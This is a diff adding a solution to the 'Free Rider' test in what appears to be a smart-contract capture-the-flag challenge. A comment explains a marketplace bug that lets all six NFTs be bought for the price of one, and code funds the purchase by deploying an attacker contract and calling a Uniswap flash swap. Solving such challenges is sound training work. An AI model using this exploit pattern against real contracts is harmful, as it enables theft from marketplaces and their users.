@@ -106,6 +106,16 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /*
+         * We notice that if we buy several NFT at once, the contract is only checking that we send enough ETH for the most expensive NFT.
+         * Thus, we can buy all 6 NFTs for the price of 1.
+         * To get started, we need to take a flashloan that we will repay with the bounty prize.
+         * This means that a contract is necessary.
+         */
+        const attackerContract = await ethers.getContractFactory('FreeRiderAttacker', player);
+        const attacker = await attackerContract.deploy(marketplace.address, devsContract.address, nft.address, weth.address, {value: 50_000_000_000_000_000n});
+        // Calling the swap will send the flashloan to the contract
+        await uniswapPair.connect(player).swap(NFT_PRICE, 0, attacker.address, "0x00");
     });
 
     after(async function () {
